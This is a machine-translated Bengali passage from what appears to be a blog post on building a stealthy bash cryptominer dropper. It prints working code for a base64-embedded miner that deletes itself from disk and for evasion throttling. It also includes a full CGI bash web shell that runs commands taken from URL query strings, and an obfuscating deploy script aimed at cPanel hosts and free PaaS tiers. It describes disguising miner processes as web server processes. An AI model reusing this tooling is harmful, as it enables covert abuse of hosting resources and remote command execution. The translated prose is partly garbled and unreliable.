হ্যাশরেট</a></h3><p>সময়ের সাথে সাথে, উজানের খনি অনেক পেয়েছে<strong> স্বয়ংক্রিয় টিউনিং</strong> বৈশিষ্ট্যগুলি, তাই এটি আমার স্ক্রিপ্টগুলির অংশকে অপ্রয়োজনীয় করে তুলেছে, কিন্তু এখানে প্রবাহ এবং নিম্ন প্রবাহের মধ্যে পার্থক্য হল যে প্রবাহের লক্ষ্য সর্বাধিক করা<em> কর্মক্ষমতা</em> , যখন আমাদের লক্ষ্য সর্বোচ্চ করা<em> দক্ষতা এবং অস্পষ্টতা</em> , আমরা সিস্টেমকে ছাড়িয়ে যেতে চাই না, আমরা পরিষেবা বিঘ্নিত না করে একটু জোঁক দিতে চাই।<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>এই জন্য, আমাদের পরিবেশ সম্পর্কে আরও দানাদার বোঝার প্রয়োজন,<code>l2/l3</code> প্রসেসর, র্যাম, এবং কোর এবং বর্তমান প্রসেসরের ক্যাশে গঠন<em> গড়</em> লোড এবং সিপিইউ<em> ব্যবহার</em>। আমি একটি নির্মাণ করার চেষ্টা করেছি<a href=https://en.wikipedia.org/wiki/Finite-state_machine> রাষ্ট্রযন্ত্র</a> bash এ যেটি ন্যূনতম থেকে শুরু হবে এবং বিভিন্ন কনফিগারেশনের চেষ্টা করবে ধীরে ধীরে গড় সেরা। এটা ছিলো একটি<strong> বিশাল</strong> প্রচেষ্টার অপচয়<a href=https://en.wikipedia.org/wiki/Technical_debt> প্রযুক্তিগত .ণ</a> যা খুব তাড়াতাড়ি দেউলিয়া হয়ে যায় এবং বেশিরভাগই বাতিল হয়ে যায়, কোডবেসে কেবল অবশিষ্টাংশ থাকে।<p>এই সমস্ত অটো টিউনিং জাম্বোকে ফ্র্যাক করুন, আমরা কেবল হোস্ট ব্যবহার/লোডের উপর নির্ভর করে খনির ঘুম তৈরি করেছি, এর জন্য প্রয়োজনীয় খনি পরিবর্তন<code>sleep</code> থ্রেডের মধ্যে ফলন, এবং কনফিগারেশন ওয়াচডগের কয়েকটি সংশোধন<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , যা আমাদের রানটাইমের সময় ঘুমের পরিমাণ পুনরায় লোড করতে দেয়। যুক্তি অনেক বেশি সরলীকৃত এবং এর মত দেখাচ্ছে:<ul><li><p>যদি ব্যবহার $ TARGET_USAGE এর উপরে/নিচে হয় (ত্রুটির মার্জিন) ঘুম বাড়ায়/কমায়<li><p>যদি গড় লোড ভিতরে<code>1m</code> $ TARGET_LOAD বিরতি/পুনরায় শুরু খনির উপরে/নীচে</ul><h3 id=connection><a class=header-anchor href=#connection> সংযোগ</a></h3><p>আমাদের ব্যাশ রাউন্ডআপে আমরা সংযোগের জন্য ইউটিলিটি দেখিয়েছি। আমাদের এসবের দরকার কেন? কারণ আমাদের বৈচিত্র্য দরকার; কনফিগারেশনে একটি এন্ডপয়েন্টকে কেবল কঠিন কোডিং দীর্ঘস্থায়ী করবে না, যখন কিছু সন্দেহজনক মনে হয় এবং নেটওয়ার্ক কার্যকলাপ থাকে, আইপিগুলি পতাকাঙ্কিত হয়।<p>শুরুতে আমরা কয়েকটি পদ্ধতি নিয়ে পরীক্ষা করেছি:<ul><li><p>ব্যবহার<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> প্রক্সিচেইন</a> মাইনার নেটওয়ার্ক কলগুলি ওভারলোড করার জন্য, কিন্তু এটি খনির প্রয়োজন ছিল ডাইনামিক লাইব্রেরি দিয়ে তৈরি করা, এবং আপনাকে সেগুলিকে পেলোড দিয়ে পাঠাতে হবে, তাই এটি অবাস্তব ছিল।<li><p>চলমান a<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> সামনে টানেল</a> খনির সাথে পাশাপাশি: এটির অনেক কনফিগারেশন ওভারহেড ছিল, যেহেতু এখন আমরা প্রতিটি স্থাপনায় দুটি প্রক্রিয়া কনফিগার করছিলাম, যা আরও বেশি বাগের পরিমাণ ছিল।</ul><p>শেষ পর্যন্ত আমরা কেবলমাত্র শেষ পয়েন্টগুলির একটি তালিকা শিপিংয়ের মাধ্যমে নিষ্পত্তি করেছি, একটি ব্যাশ ভেরিয়েবলে সংরক্ষিত, একটিকে এলোমেলোভাবে বেছে নেওয়া। সংযোগগুলি অবশ্যই এনক্রিপ্ট করা হয়েছিল। এই শেষ পয়েন্ট কি? প্রক্সিতে ফরওয়ার্ডার যা খনি শ্রমিকদের কাজ পরিচালনা করবে।</p><img src=/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png><p>আমাদের কেন দরকার?<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> খনির প্রক্সি</a> ? আমি সত্যিই ~ 100 একযোগে সংযোগের অতীত যাইনি, তাই নেটওয়ার্ক লোডের জন্য প্রক্সি সত্যিই প্রয়োজন ছিল না, তবে হ্যাশিং অ্যালগরিদম নিয়ে আলোচনা করার জন্য এবং বিভিন্ন খনিকে বিভিন্ন অসুবিধা লক্ষ্যমাত্রা প্রদান করার জন্য, খনিকে কাজ করতে বাধা দেওয়ার জন্য এটি সুবিধাজনক ছিল।<strong> অসুবিধা</strong> লক্ষ্যগুলি যা তাদের সম্পূর্ণ করতে খুব বেশি সময় নেবে এবং অসমাপ্ত চাকরিতে গণনা নষ্ট করার ঝুঁকি এড়াবে।<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> পুল সফটওয়্যারেও কিছু পরিবর্তন প্রয়োজন কারণ এটি আনন্দের সাথে সরল http অনুরোধের প্রক্সি হওয়ার বিজ্ঞাপন ছিল ...<em> যা সময়সীমা শেষ করতে হয়েছিল</em> , এবং একটি কাঁটা যোগ করা অ্যাক্সেস কন্ট্রোল তাই আমরা যে উপর আমাদের মোড ভিত্তিক।<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Json সম্পাদনা</a></h3><p>একটি জসন ফাইলে পরিবর্তনগুলি প্রয়োগ করা শুধু ব্যাশের সাথে আমরা কিছু env var প্রতিস্থাপন, এবং কিছু regex দিয়ে পেয়েছি। প্রাথমিকভাবে আমরা একটি এর উপর নির্ভর করছিলাম<code>envsubst</code> ভেরিয়েবল প্রয়োগ করার জন্য বাইনারি, তারপর আমরা সম্পূর্ণ ব্যাশ গিয়েছিলাম<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> এই যুক্তি দিয়ে:<ul><li><p>কনফিগ টেমপ্লেট পড়ুন<li><p>একটি খুব গুপ্ত স্ট্রিং (যেমন<code>_#_#</code>)<li><p><code>eval</code> টেমপ্লেট<li><p>সমস্ত গুপ্ত ঘটনার পুনরাবৃত্তি উদ্ধৃতি দিয়ে</ul><p>সাব প্রসেস এড়িয়ে যাওয়া ছাড়াও, আরেকটি সুবিধা হল যে আমরা আমাদের টেমপ্লেটগুলিতে সম্পূর্ণ ব্যাশ ক্ষমতা পাই। টেমপ্লেট ছাড়া পড়া এবং লেখার জন্য, আমাদের bash regex ক্ষমতার উপর নির্ভর করতে হবে:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>এটি শুধুমাত্র আমাদের একক লাইন সম্পাদনা করতে দেয়, মাল্টি-লাইন এন্ট্রিগুলির জন্য এটি কেবল প্রথম লাইন বিবেচনা করে..কিন্তু এটি আমাদের ব্যবহারের ক্ষেত্রে যথেষ্ট ভাল।<h2 id=runtime><a class=header-anchor href=#runtime> রানটাইম</a></h2><p>আমাদের রানটাইম দেখতে কেমন? আমাদের একটি প্রধান বাশ প্রক্রিয়া রয়েছে যা মূল লুপটি সম্পাদন করে, তারপর মাইনার সাব-প্রসেস, সিপিইউ মনিটর সাব-প্রসেস, লকার এবং টিউনার। এটা প্রায় মুষ্টিমেয়।<p>প্রথমে আমরা নিশ্চিত করতে চাই যে যদি কিছু ভুল হয়ে যায়, আমরা কোন গোলমাল ছাড়ি না, এর মানে হল যে আমরা পরিসমাপ্তিতে পরিষ্কার করার জন্য একটি ব্যাশ ফাঁদ ব্যবহার করি<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> পুনরাবৃত্তি রোধ করতে ফাঁদ unsets। ফাঁদ সমস্ত চাকরি মেরে ফেলে এবং কাজের পরিবেশ দূর করে।<p>এটি মাইনার শুরু করার সময়, যা বেস 64 এনকোডিংয়ে ব্যাশ ভেরিয়েবল হিসাবে সংরক্ষণ করা হয়। আমরা এটি ফাইল সিস্টেমে ডাম্প করি, তারপরে আমরা কনফিগ ডাম্প করি, মাইনারটি চালাই এবং মাইনার এবং কনফিগ উভয়ই সরিয়ে ফেলি। লিনাক্সে আপনি একটি চলমান প্রক্রিয়ার এক্সিকিউটেবল অপসারণ করতে পারেন, (উইন্ডোতে এটি অনুমোদিত নয়)।<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> যখন খনির কাজ চলছে, তখন ফাইল সিস্টেমে কেবল একটি<code>.. /</code> একটি সঙ্গে ডিরেক্টরি<code>b64</code> তার মধ্যে লিঙ্ক।<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>খনির এনকোডিং করার সময় ব্যাশের সাথে মুখোমুখি হওয়া একটি উদ্দীপক কৌতুক হ'ল উদ্ধৃতি সহ সাবশেলের সাথে একটি পরিবর্তনশীল বরাদ্দ করা<code>myvar="$(something)"</code> মেমরি ব্যবহারে স্থায়ী বৃদ্ধি ঘটায়, এটি ডিবাগ করা কঠিন ছিল এবং এইরকম আচরণ করার কারণটি সত্যিই খুঁজে পাইনি, যাইহোক অ্যাসাইনমেন্টটি উদ্ধৃত হতে হবে। পরিবর্তে ডিকোডিং করা হয়<em> herestrings</em> যা অস্থায়ী ফাইলগুলির উপর একটি বিমূর্ততা, ভেরিয়েবলটি একটি ফাইলে ফেলে দেওয়া হয় যা পরে প্রক্রিয়াটিতে ফিরে আসে।<p>খনির দীর্ঘ চলমান লুপ:<ul><li><p>যখন সত্য<ul><li><p>খনি বন্ধ করুন<li><p>কনফিগারেশন সরান<li><p>খনি শুরু করুন<li><p>যখন সত্য<ul><li><p>ডেমন শুরু করুন<ul><li><p>যখন খনির কাজ চলছে<ul><li><p>খনি থেকে আউটপুট পড়ুন<li><p>আউটপুট লাইনের উপর ভিত্তি করে মাইনার অ্যাকশন বেছে নিন</ul></ul><li><p>যদি খনির কাজ না হয়: বিরতি</ul><li><p>ঘুম</ul></ul><p>আউটপুট লাইন কিছু regex সঙ্গে মিলিত হয়:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>ডেমন যেখানে কেস পরিচালনা করে<ul><li><p>এন্ডপয়েন্টের সংযোগ ত্রুটি দেয় (একটি নতুন এলোমেলো এন্ডপয়েন্ট বেছে নিন)<li><p>হ্যাশিং অ্যালগরিদম পরিবর্তন (ঘুমের সময় এবং অ্যাড-হক কনফিগারেশন সামঞ্জস্য করুন)<li><p>খনি সমস্যা (মাইনার পুনরায় চালু করুন)।</ul><p>কিছুক্ষণের জন্য কমান্ড এবং কন্ট্রোল ড্যাশবোর্ডের জন্য সমর্থন ছিল, যা ম্যানুয়াল পুনরায় চালু করার অনুমতি দেয়, তবে যেহেতু এর ব্যবহার সর্বনিম্ন ছিল তাই এটি বাতিল করা হয়েছিল, এবং এর শেষ পয়েন্টগুলি একটি বিকল্প পুল সংযোগের সাথে প্রতিস্থাপিত হয়েছিল, পুন restসূচনা প্রক্রিয়াটিও অস্থিতিশীল, জটিল ছিল। .. প্রযুক্তি debtণের আরেকটি উদাহরণ। তবে এটি একটি আপডেটেড পেলোড পুনরায় আনতে এবং ফ্লাইতে সমস্ত কনফিগারেশন পুনরায় সেটআপ করার অনুমতি দেয়, যা বেশ দুর্দান্ত ছিল, চূড়ান্ত ট্রাম্পোলিন।<h2 id=debugging><a class=header-anchor href=#debugging> ডিবাগিং</a></h2><p>তিনটি প্রধান উপযোগিতা আছে<ul><li><p>কোড ব্লকের চারপাশে ট্রেসিং সক্ষম/অক্ষম করুন (আমরা একটি ভেরিয়েবলে একটি b64 এনকোডেড বাইনারি ট্রেস করতে চাই না ..)<li><p>লগ ফরম্যাট করার জন্য একটি সহজ ফাংশন<li><p>একটি পতাকা যা খনির কাজ শুরু করার সময় রানটাইমে ভার্বোস লগিং সক্রিয় করবে।<ul><li><p>ফাইল করে<code>.debug</code> বিদ্যমান?<ul><li><p>ভার্বোস লগিং সক্ষম করুন</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> লক্ষ্য স্থাপনা</a></h2><p>এই সেটআপ 3 ধরনের হোস্টে পরীক্ষা করা হয়েছে:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> স্ব -হোস্টেড কন্টেইনার বা ভিএম</a></h3><p>অনেক হোস্টিং প্রদানকারী মাইনিং পছন্দ করে না যেহেতু CPU রিসোর্স একাধিক ব্যবহারকারীর মধ্যে ভাগ করা হয়, এবং মাইনিং সফটওয়্যার সহজেই একটি হোস্ট নোডকে ধীর করতে পারে যা বাকি ব্যবহারকারীদের কর্মক্ষমতাকে প্রভাবিত করে। সিপিইউ ব্যবহারকারীর সময় সীমাহীন থাকলেও এটি সত্য হতে পারে, কারণ হ্যাশিং অ্যালগরিদমগুলি সিপিইউর সমস্ত ক্যাশিং স্তরকে পরিপূর্ণ করতে পারে যদি ক্যাশে সমস্ত সিপিইউ কোরের মধ্যে ভাগ করা হয়।<p>আমরা আমাদের ব্যবহার করতে চাই<em> ন্যায্য</em> নিষিদ্ধ না হয়ে সম্পদের ভাগ, এটি আমাদের স্টিলথ ড্রপার এর জন্য একটি ভাল ব্যবহার-কেস কারণ এটি হোস্ট ব্যবহার সচেতন, যার অর্থ এটি<em> উচিত</em> [AUP] এর মধ্যে থাকুন। স্ব -হোস্টেড স্থাপনার সাথে কাজ করার সময় কোনও অতিরিক্ত পদক্ষেপ নেই, কেবল লঞ্চার স্ক্রিপ্ট, সম্ভবত বুট ক্রমে যোগ করা হয়েছে বা ম্যানুয়ালি চালু করা হয়েছে।<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> cPanel ভিত্তিক ওয়েব হোস্টিং</a></h3><p>ওয়েব হোস্টিং সাবস্ক্রিপশন প্ল্যানগুলি বেশিরভাগই [cPanel] এর মাধ্যমে দেওয়া হয়। আবার এখানে আমরা ব্যক্তিগত সাবস্ক্রিপশন প্ল্যান ব্যবহার করছি যার যুক্তিসঙ্গত সম্পদের সীমা রয়েছে, অন্যদিকে যে কোনও বিনামূল্যে পরিকল্পনার হাস্যকর সীমা রয়েছে<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> । সিপ্যানেল আপনাকে বিভিন্ন ফাইল এক্সটেনশনের জন্য হ্যান্ডলার সংজ্ঞায়িত করতে দেয়, এটি আমাদের মাধ্যমে শেল স্ক্রিপ্টগুলি চালানোর অনুমতি দেয়<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> সিজিআই</a> সার্ভারে আপলোড করা শেল স্ক্রিপ্টের বিরুদ্ধে একটি http অনুরোধ সহ। এই ধরনের ইন্টারফেসগুলি ওয়েব-শেলগুলি দেখতে কেমন<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> । একটি সাধারণ ব্যাশ ওয়েব শেল<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>কেবলমাত্র বিল্টইনগুলির উপর নির্ভর করা ভাল কারণ ওয়েব কারাগারে অতিরিক্ত প্রক্রিয়াগুলি অনুমোদিত হতে পারে না, তবে এটি সর্বদা সম্ভব<code>exec</code> যা আমাদের অধিকাংশ কমান্ড লাইন ইউটিলিটি ব্যবহার করতে দেয়। বেশিরভাগ ওয়েব শেল পাইথন বা পিএইচপির মতো অন্যান্য স্ক্রিপ্টিং ভাষায় লেখা হয় কারণ আপনাকে কাঁটাচামচ সম্পর্কে চিন্তা করতে হবে না।<p>একটি cpanel পরিবেশে খনি প্রক্রিয়ার জন্য একটি স্ট্যাটিক নাম ব্যবহার করা ভাল, যেমন<code>httpd</code> অথবা<code>php-fpm</code> কারণ<code>cgi</code> মাল্টি প্রসেসিং এর উপর ভিত্তি করে, তাই সার্ভার সবসময় এই ধরনের অনেক প্রসেসে ভরা থাকে, যদিও একজন সতর্ক পর্যবেক্ষকের লক্ষ্য করা উচিত<em> মাল্টি-থ্রেডেড</em> পার্ল, পিএইচপি, রুবি, বা পাইথনের মতো ভাষার জন্য ব্যবহার প্যাটার্ন যা স্পষ্টভাবে সাধারণ (বা সম্ভব নয়)!<p>প্রক্রিয়াগুলির ডিফল্টরূপে একটি সময়সীমা থাকে, (1 ঘন্টা, 1 দিন, ইত্যাদি ..), এর জন্য আমরা কেবল একটি ক্রোন কাজ ব্যবহার করি যা ড্রপারটি পুনরায় চালু করে।<p>এর জন্য প্রচুর ম্যানুয়াল এডিটিং প্রয়োজন, cpanel api স্বয়ংক্রিয়ভাবে এটি ব্যবহারকারীদের কাছে দুর্ভাগ্যজনকভাবে উন্মুক্ত নয়, তাই ওয়েব হোস্টিং আমাদের মাইনার ড্রপারের জন্য একটি ক্লান্তিকর এবং বিরক্তিকর লক্ষ্য।<h3 id=web_environments><a class=header-anchor href=#web_environments> ওয়েব পরিবেশ</a></h3><p>সেখানে<em> SaaS</em> যেসব প্রদানকারীর একটি ওয়েব এডিটর আছে, যেমন একটি ধারক, যেমন<a href="with a free tier before getting acquired by amazon"> মেঘ 9</a> , [codeanywhere], [কোডেনভি]। এখানে ড্রপার মোতায়েন করা সহজ (আপনার একটি পরিপূর্ণ পরিবেশ আছে), কিন্তু এটি চালু রাখা একটি বোঝা, যেহেতু যেকোনো ইন্টারেক্টিভ ওয়েব এডিটর ওয়েব পেজ বন্ধ হওয়ার পরপরই তার অধিবেশন শেষ করে দেয়, এবং কন্টেইনারটি ফলস্বরূপ ঘুমিয়ে পড়ে (যদি না আপনি অবশ্যই পরিশোধ করুন)।<p>এটিকে পরিবর্ধন করার অর্থ কেবল এই হতে পারে যে আমাদের সেশনগুলি খোলা রাখতে হবে, [পুতুল] এর সাথে কিছু স্ক্রিপ্টিং কাঙ্খিত ফলাফল অর্জন করেছে, কিন্তু দীর্ঘ সময় ধরে চলতে থাকা, মেমরি লিক হওয়া, ফুলে যাওয়া এসপিএ ওয়েব পেজগুলি অবশ্যই আকর্ষণীয় এবং গোপন নয়, কারণ প্রদানকারী ব্যাকএন্ড থেকে, 24/7 খোলা একটি সেশন অবশ্যই সন্দেহজনক দেখাবে। প্রকৃতপক্ষে, ওয়েব পরিবেশগুলিও অস্পষ্ট এবং বিরক্তিকর লক্ষ্য।<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> বিনামূল্যে অ্যাপ্লিকেশন পরিষেবা</a></h3><p>এটি মূলত<a href="when it used to have a free tier"> openshift</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> এবং [হিরকু]। ওপেনশিফ্ট, কুবেরনেট হওয়া মোতায়েন করা কিছুটা সহজ ছিল, কিন্তু কনফিগারেশন মন্থনে পূর্ণ, এখানে একটি উদ্ধৃতাংশ দেওয়া হল:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
